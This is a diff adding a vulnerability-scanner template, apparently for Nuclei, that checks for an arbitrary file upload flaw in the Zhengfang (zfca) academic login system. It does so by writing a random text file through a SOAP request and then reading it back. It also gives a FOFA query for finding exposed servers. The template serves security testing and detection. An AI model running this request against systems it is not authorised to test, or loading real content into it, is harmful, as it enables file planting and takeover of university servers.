@@ -1,0 +1,32 @@
+id: zfca_createcafile_upload
+
+info:
+  name: 正方教务统一认证登录asix任意文件上传
+  author: Xc1Ym
+  severity: critical
+  description: 正方教务统一认证登录asix任意文件上传
+  metadata:
+    fofa-qeury: header="/zfca/login",body="zfca" && body="ActiveX"
+    veified: true
+    max-request: 1
+  tags: upload,others,intrusive
+variables:
+  filename: '{{rand_base(6)}}'
+  payload: '{{rand_base(6)}}'
+
+http:
+    - method: POST
+      path: 
+        - "{{RootURL}}/zfca/axis/CreateCaFile"
+      headers:
+        SOAPAction: 
+      body: '<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com"><soapenv:Header/><soapenv:Body><pub:createFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{{filename}}.txt</filepath><content xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"><![CDATA[{{payload}}]]></content></pub:createFile></soapenv:Body></soapenv:Envelope>'
+    - method: GET
+      path: 
+        - "{{RootURL}}/zfca/{{filename}}.txt"
+      matchers:     
+        - type: word
+          part: body
+          words:
+            - '{{payload}}'
+# digest: 4a0a00473045022100d02bfcb8bff8ea2fc2e7651ead06f8bd7e532927eb26c02a06dfd9011b7d268202201c717f7e0ea8ecf548ee3c1898cdab1b114f7c8019b6e9dc6fadcb215ec1e232:6b2dd5af372f02ed15a56faf8ad98cf9
